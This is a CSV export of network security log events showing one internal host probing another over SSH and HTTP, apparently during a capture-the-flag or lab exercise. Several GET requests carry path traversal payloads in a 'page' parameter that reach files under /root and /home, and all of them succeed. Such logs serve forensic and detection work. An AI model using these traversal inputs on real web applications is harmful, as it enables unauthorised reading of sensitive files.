"@timestamp","user.name","source.ip","source.geo.country_name","host.hostname","event.action","event.outcome","event.category","suricata.eve.event_type","related.ip","related.user","related.hash","process.name","process.command_line","destination.ip","network.protocol","destination.address","http.request.method","http.response.status_code","suricata.eve.http.http_content_type","url.query","url.domain","url.original"
"Aug 4, 2026 @ 10:39:14.078","-","10.10.1.10","-","-","-","-",network,flow,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",ssh,"10.10.1.150","-","-","-","-","-","-"
"Aug 4, 2026 @ 10:20:03.149","-","10.10.1.10","-","-","-","-",network,ssh,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",ssh,"10.10.1.150","-","-","-","-","-","-"
"Aug 4, 2026 @ 10:19:34.109","-","10.10.1.10","-","-","-","-",network,flow,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",http,"10.10.1.150","-","-","-","-","-","-"
"Aug 4, 2026 @ 10:19:25.112","-","10.10.1.10","-","-","-","-",network,flow,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",http,"10.10.1.150","-","-","-","-","-","-"
"Aug 4, 2026 @ 10:19:11.034","-","10.10.1.10","-","-","-","-",network,flow,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",http,"10.10.1.150","-","-","-","-","-","-"
"Aug 4, 2026 @ 10:18:25.138","-","10.10.1.10","-","-","-",success,"network, web",http,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",http,"10.10.1.150",GET,200,"text/html","page=../../../../tmp/flag.txt","10.10.1.150","/?page=../../../../tmp/flag.txt"
"Aug 4, 2026 @ 10:18:16.746","-","10.10.1.10","-","-","-",success,"network, web",http,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",http,"10.10.1.150",GET,200,"text/html","page=../../../../tmp/riddle.txt","10.10.1.150","/?page=../../../../tmp/riddle.txt"
"Aug 4, 2026 @ 10:17:59.789","-","10.10.1.10","-","-","-","-",network,flow,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",ssh,"10.10.1.150","-","-","-","-","-","-"
"Aug 4, 2026 @ 10:17:59.114","-","10.10.1.10","-","-","-",success,"network, web",http,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",http,"10.10.1.150",GET,200,"text/html","page=../../../../root/","10.10.1.150","/?page=../../../../root/"
"Aug 4, 2026 @ 10:17:20.781","-","10.10.1.10","-","-","-","-",network,flow,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",ssh,"10.10.1.150","-","-","-","-","-","-"
"Aug 4, 2026 @ 10:16:40.666","-","10.10.1.10","-","-","-","-",network,ssh,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",ssh,"10.10.1.150","-","-","-","-","-","-"
"Aug 4, 2026 @ 10:16:08.067","-","10.10.1.10","-","-","-","-",network,flow,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",ssh,"10.10.1.150","-","-","-","-","-","-"
"Aug 4, 2026 @ 10:15:24.804","-","10.10.1.10","-","-","-","-",network,ssh,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",ssh,"10.10.1.150","-","-","-","-","-","-"
"Aug 4, 2026 @ 10:14:46.901","-","10.10.1.10","-","-","-","-",network,ssh,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",ssh,"10.10.1.150","-","-","-","-","-","-"
"Aug 4, 2026 @ 10:14:19.524","-","10.10.1.10","-","-","-","-",network,flow,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150","-","10.10.1.150","-","-","-","-","-","-"
"Aug 4, 2026 @ 10:05:04.889","-","10.10.1.10","-","-","-","-",network,flow,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",ssh,"10.10.1.150","-","-","-","-","-","-"
"Aug 4, 2026 @ 09:58:22.896","-","10.10.1.10","-","-","-","-",network,flow,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",http,"10.10.1.150","-","-","-","-","-","-"
"Aug 4, 2026 @ 09:58:18.893","-","10.10.1.10","-","-","-","-",network,flow,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",http,"10.10.1.150","-","-","-","-","-","-"
"Aug 4, 2026 @ 09:57:50.903","-","10.10.1.10","-","-","-","-",network,flow,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",http,"10.10.1.150","-","-","-","-","-","-"
"Aug 4, 2026 @ 09:57:41.884","-","10.10.1.10","-","-","-","-",network,flow,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",http,"10.10.1.150","-","-","-","-","-","-"
"Aug 4, 2026 @ 09:57:30.817","-","10.10.1.10","-","-","-","-",network,flow,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",http,"10.10.1.150","-","-","-","-","-","-"
"Aug 4, 2026 @ 09:57:16.712","-","10.10.1.10","-","-","-",success,"network, web",http,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",http,"10.10.1.150",GET,200,"text/html","page=../../../../root/flag.txt","10.10.1.150","/?page=../../../../root/flag.txt"
"Aug 4, 2026 @ 09:57:03.988","-","10.10.1.10","-","-","-",success,"network, web",http,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",http,"10.10.1.150",GET,200,"text/html","page=../../../../root/riddle.txt","10.10.1.150","/?page=../../../../root/riddle.txt"
"Aug 4, 2026 @ 09:56:39.417","-","10.10.1.10","-","-","-",success,"network, web",http,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",http,"10.10.1.150",GET,200,"text/html","page=../../../../home/usr/riddle.txt","10.10.1.150","/?page=../../../../home/usr/riddle.txt"
"Aug 4, 2026 @ 09:56:30.971","-","10.10.1.10","-","-","-",success,"network, web",http,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",http,"10.10.1.150",GET,200,"text/html","page=../../../../home/usr/secret.txt","10.10.1.150","/?page=../../../../home/usr/secret.txt"
"Aug 4, 2026 @ 09:56:18.108","-","10.10.1.10","-","-","-",success,"network, web",http,"10.10.1.10, 10.10.1.150","-","-","-","-","10.10.1.150",http,"10.10.1.150",GET,200,"text/html","page=../../../../home/usr/flag.txt","10.10.1.150","/?page=../../../../home/usr/flag.txt"
